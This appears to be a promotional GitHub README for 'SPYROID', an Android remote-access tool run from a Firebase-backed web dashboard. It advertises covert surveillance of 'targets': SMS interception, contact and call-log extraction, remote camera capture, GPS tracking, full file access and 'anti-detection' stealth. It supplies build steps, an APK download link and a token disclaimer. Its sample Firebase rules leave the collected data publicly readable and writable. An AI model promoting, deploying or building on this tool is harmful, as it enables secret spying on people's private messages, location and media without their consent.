# <div align="center">🕵️‍♂️ **SPYROID** 🤖</div>

<div align="center">

### _The Ultimate Serverless Mobile Intelligence System_


---

<p align="center">
  
</p>

<div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;">
  
  
  
  
</div>

<br/>

```ascii
███████╗██████╗ ██╗   ██╗██████╗  ██████╗ ██╗██████╗
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗██║██╔══██╗
███████╗██████╔╝ ╚████╔╝ ██████╔╝██║   ██║██║██║  ██║
╚════██║██╔═══╝   ╚██╔╝  ██╔══██╗██║   ██║██║██║  ██║
███████║██║        ██║   ██║  ██║╚██████╔╝██║██████╔╝
╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝
```

<h3>🎯 <em>Advanced Remote Android Device Management & Intelligence Gathering</em></h3>

</div>

---

## 🌟 **PROJECT OVERVIEW**

<table>
<tr>
<td width="50%">

### 🚀 **What is SPYROID?**

**SPYROID** is a cutting-edge, serverless mobile intelligence system that revolutionizes remote Android device management. Built with modern architecture using **Kotlin**, **React.js**, and **Firebase**, it provides seamless, real-time command execution without any traditional backend infrastructure.

</td>
<td width="50%">

### 🎨 **Key Highlights**

- 🔥 **Zero-Server Architecture**
- ⚡ **Real-time Firebase Sync**
- 🎯 **Advanced Device Control**
- 🛡️ **Secure & Encrypted**
- 🌐 **Web-based Dashboard**
- 📱 **Native Android Performance**

</td>
</tr>
</table>

---

## ✨ **FEATURE MATRIX**

<div align="center">

| 🎯 **Core Features** | 📱 **Mobile Capabilities** | 🌐 **Web Dashboard** |     🔒 **Security**      |
| :------------------: | :------------------------: | :------------------: | :----------------------: |
|  Real-time Commands  |     📞 Call Management     |  📊 Live Analytics   | 🔐 End-to-End Encryption |
| Data Synchronization |     💬 SMS Operations      |  🎛️ Control Center   |     🛡️ Firebase Auth     |
|   Remote Execution   |      📸 Camera Access      | 📈 Device Monitoring | 🔑 Permission Management |
|     Live Updates     |     🖼️ Gallery Control     |  📋 Command History  |    🚫 Anti-Detection     |

</div>

---

## 🛠️ **TECHNOLOGY ECOSYSTEM**

<div align="center">

<table>
<tr>
<td align="center" width="25%">

<br/>
<sub><b>Modern React UI</b><br/>Responsive Dashboard</sub>
</td>
<td align="center" width="25%">

<br/>
<sub><b>Native Android</b><br/>High Performance</sub>
</td>
<td align="center" width="25%">

<br/>
<sub><b>Real-time DB</b><br/>Cloud Sync</sub>
</td>
<td align="center" width="25%">

<br/>
<sub><b>Development</b><br/>Professional IDE</sub>
</td>
</tr>
</table>

</div>

---

## 🏗️ **SYSTEM ARCHITECTURE**

```mermaid
graph TB
    subgraph "🌐 Web Interface"
        A[Admin Dashboard<br/>React.js] --> B[Command Center]
        B --> C[Device Monitor]
        C --> D[Analytics Panel]
    end

    subgraph "🔥 Firebase Cloud"
        E[Realtime Database] --> F[Authentication]
        F --> G[Cloud Storage]
        G --> H[Security Rules]
    end

    subgraph "📱 Android Device"
        I[SPYROID App<br/>Kotlin] --> J[Command Listener]
        J --> K[Data Collector]
        K --> L[Permission Manager]
    end

    A -->|Commands| E
    E -->|Real-time Sync| I
    I -->|Data Upload| E
    E -->|Status Updates| A

    I --> M[📞 Call Control]
    I --> N[💬 SMS Manager]
    I --> O[📸 Camera Access]
    I --> P[🖼️ Gallery Control]
    I --> Q[📂 File Manager]
    I --> R[📍 Location Services]

    style A fill:#00D4FF,stroke:#ffffff,stroke-width:2px,color:#000000
    style E fill:#FFCA28,stroke:#ffffff,stroke-width:2px,color:#000000
    style I fill:#0095D5,stroke:#ffffff,stroke-width:2px,color:#ffffff
```

<div align="center">



</div>

---

## 🎯 **ADVANCED CAPABILITIES**

<details>
<summary><b>📱 Mobile Intelligence Features</b></summary>

### 🔍 **Data Collection**

- **📋 Contact Extraction**: Complete phonebook access
- **📞 Call Logs**: Incoming/outgoing call history
- **💬 SMS Monitoring**: Message interception & forwarding
- **📸 Camera Control**: Remote photo/video capture
- **🖼️ Gallery Access**: Media file retrieval
- **📂 File System**: Complete device file access
- **📍 GPS Tracking**: Real-time location monitoring
- **📊 Device Info**: System statistics & hardware details

### ⚡ **Real-time Operations**

- **🎯 Live Commands**: Instant command execution
- **🔄 Auto-sync**: Continuous data synchronization
- **📡 Background Service**: Persistent operation
- **🔋 Battery Optimization**: Efficient resource usage

</details>

<details>
<summary><b>🌐 Web Dashboard Features</b></summary>

### 📊 **Control Center**

- **🎛️ Command Interface**: Intuitive control panel
- **📈 Real-time Monitoring**: Live device status
- **📋 Activity Logs**: Comprehensive operation history
- **🔍 Search & Filter**: Advanced data filtering
- **📱 Multi-device Support**: Manage multiple targets
- **⚙️ Settings Management**: Configuration control

### 📈 **Analytics & Reporting**

- **📊 Usage Statistics**: Detailed analytics dashboard
- **📉 Performance Metrics**: System performance tracking
- **📅 Timeline View**: Chronological activity view
- **🔔 Alert System**: Real-time notifications

</details>

---

## 🚀 **QUICK DEPLOYMENT**

<div align="center">

### 🎯 **One-Command Setup**

</div>

<table>
<tr>
<td width="50%">

### 📱 **Mobile App Setup**

```bash
# 🚀 Clone the repository
git clone https://github.com/nk-alam/SpyRoid.git
cd SpyRoid/mobile-app

# 🔧 Open in Android Studio
# Import project & sync Gradle

# 🔥 Add Firebase config
# Place google-services.json in app/

# 📱 Build & Deploy
./gradlew assembleRelease
```

</td>
<td width="50%">

### 🌐 **Web Dashboard Setup**

```bash
# 📂 Navigate to dashboard
cd SpyRoid/admin-panel

# 📦 Install dependencies
npm install

# 🔥 Configure Firebase
# Update src/config/firebase.js

# 🚀 Launch dashboard
npm start
```

</td>
</tr>
</table>

---

## ⚙️ **CONFIGURATION GUIDE**

<details>
<summary><b>🔥 Firebase Setup</b></summary>

### 1️⃣ **Create Firebase Project**

```javascript
// Firebase Security Rules
{
  "rules": {
    "spyroid": {
      "commands": {
        ".read": true,
        ".write": true
      },
      "device-data": {
        ".read": true,
        ".write": true
      },
      "analytics": {
        ".read": true,
        ".write": true
      }
    }
  }
}
```

### 2️⃣ **Environment Configuration**

```env
# Admin Panel Environment
REACT_APP_FIREBASE_API_KEY=your_api_key_here
REACT_APP_FIREBASE_AUTH_DOMAIN=your_domain.firebaseapp.com
REACT_APP_FIREBASE_DATABASE_URL=your_database_url
REACT_APP_FIREBASE_PROJECT_ID=your_project_id
REACT_APP_FIREBASE_STORAGE_BUCKET=your_bucket.appspot.com
```

</details>

---

## 📂 **SOURCE CODE**

### 🌐 **Admin Panel Code**

Below is a sample of the React.js admin panel code structure for the SPYROID dashboard.

```jsx
// src/App.js
import React from "react";
import { BrowserRouter as Router, Route, Switch } from "react-router-dom";
import Dashboard from "./components/Dashboard";
import CommandCenter from "./components/CommandCenter";
import Analytics from "./components/Analytics";
import "./App.css";

function App() {
  return (
    <Router>
      <div className="app-container">
        <Switch>
          <Route exact path="/" component={Dashboard} />
          <Route path="/commands" component={CommandCenter} />
          <Route path="/analytics" component={Analytics} />
        </Switch>
      </div>
    </Router>
  );
}

export default App;
```

### 📱 **Android Code**

Below is a sample of the Kotlin code for the SPYROID Android app.

```kotlin
// app/src/main/java/com/spyroid/app/MainActivity.kt
package com.spyroid.app

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.FirebaseDatabase
import com.spyroid.app.services.CommandListenerService

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Firebase
        val database = FirebaseDatabase.getInstance()
        val ref = database.getReference("spyroid/commands")

        // Start command listener service
        startService(Intent(this, CommandListenerService::class.java))
    }
}
```

---

## 📱 **DEMO ACCESS**

<div align="center">

<table>
<tr>
<td align="center" width="50%">
<a href="https://github.com/nk-alam/SpyRoid/releases/latest">
  
</a>
<br/>
<sub><b>Download the latest SPYROID APK from GitHub Releases</b></sub>
</td>
<td align="center" width="50%">
<a href="https://spyroid.nk-alam.dev/demo">
  
</a>
<br/>
<sub><b>Explore the SPYROID Admin Panel live demo</b></sub>
</td>
</tr>
</table>

</div>

---

## 📊 **PROJECT STATISTICS**

<div align="center">


<br/><br/>

[](https://github.com/nk-alam/SpyRoid)

</div>

---

## 🛣️ **DEVELOPMENT ROADMAP**

<div align="center">


</div>

### 🎯 **Upcoming Features**

- [ ] 🤖 **AI-Powered Analytics**: Machine learning insights
- [ ] 🔍 **Advanced Stealth Mode**: Enhanced concealment
- [ ] 📊 **Custom Dashboards**: Personalized interfaces
- [ ] 🌍 **Multi-language Support**: Global accessibility
- [ ] 🔗 **API Integration**: Third-party service connections
- [ ] ☁️ **Cloud Storage**: Advanced data management

---

## 📱 **VISUAL SHOWCASE**

<div align="center">

### 🎨 **Interface Gallery**

<table>
<tr>
<td align="center" width="33%">

<br/><b>📱 Mobile Interface</b>
</td>
<td align="center" width="33%">

<br/><b>🌐 Control Center</b>
</td>
<td align="center" width="33%">

<br/><b>📊 Analytics Hub</b>
</td>
</tr>
</table>

</div>

---

## 🆘 **SUPPORT & COMMUNITY**

<div align="center">

<table>
<tr>
<td align="center" width="25%">

<br/>
<a href="https://github.com/nk-alam/SpyRoid/wiki"><b>Comprehensive Docs</b></a>
</td>
<td align="center" width="25%">

<br/>
<a href="https://github.com/nk-alam/SpyRoid/issues"><b>Bug Reports</b></a>
</td>
<td align="center" width="25%">

<br/>
<a href="https://github.com/nk-alam/SpyRoid/discussions"><b>Community Hub</b></a>
</td>
<td align="center" width="25%">

<br/>
<a href="mailto:nkalam@spyroid.dev"><b>Direct Support</b></a>
</td>
</tr>
</table>

</div>

---

## 🤝 **CONTRIBUTING**

<div align="center">

### 🌟 **Join the SPYROID Development Team**

We welcome contributions from security researchers, developers, and enthusiasts!

</div>

```bash
# 🍴 Fork the repository
# 🌿 Create your feature branch
git checkout -b feature/AmazingFeature

# 💾 Commit your changes
git commit -m 'Add some AmazingFeature'

# 📤 Push to the branch
git push origin feature/AmazingFeature

# 🔄 Open a Pull Request
```

---

## 🔒 **SECURITY & ETHICS**

<div align="center">

⚠️ **IMPORTANT DISCLAIMER** ⚠️

**SPYROID is designed for educational purposes, security research, and legitimate device management scenarios. Users are responsible for complying with all applicable laws and regulations in their jurisdiction.**

</div>

### 🛡️ **Security Features**

- 🔐 **End-to-End Encryption**: All data transmission secured
- 🔑 **Firebase Authentication**: Secure access control
- 🛡️ **Permission Management**: Granular access controls
- 🚫 **Anti-Detection**: Stealth operation capabilities
- 📊 **Audit Logs**: Complete activity tracking

---

## 📄 **LICENSE & LEGAL**

<div align="center">


**This project is licensed under the MIT License**  
_See the [LICENSE](LICENSE) file for complete details_

</div>

---

## 🌟 **ACKNOWLEDGMENTS**

<div align="center">

### 💝 **Special Thanks**

🔥 **Firebase Team** - Real-time database excellence  
🤖 **Android Community** - Development support  
⚛️ **React Community** - Frontend innovation  
🛡️ **Security Researchers** - Ethical guidelines  
👥 **Contributors** - Community support

</div>

---

<div align="center">

## 👨‍💻 **CREATED BY**


<br/>

[](https://github.com/nk-alam)
[](https://twitter.com/nkalam)
[](https://linkedin.com/in/nkalam)

<br/><br/>

### 🌟 **If SPYROID helped you, please consider giving it a ⭐!**


</div>

---

<div align="center">

### 🏷️ **SEARCH TAGS**

`android` `kotlin` `react` `firebase` `mobile-control` `remote-access` `serverless` `real-time` `admin-panel` `device-management` `contacts` `sms` `camera` `gallery` `spyroid` `surveillance` `intelligence` `security-research` `penetration-testing` `mobile-security` `rat` `remote-administration` `stealth` `monitoring` `open-source`

---


**© 2025 SPYROID - Advanced Mobile Intelligence System**

</div>
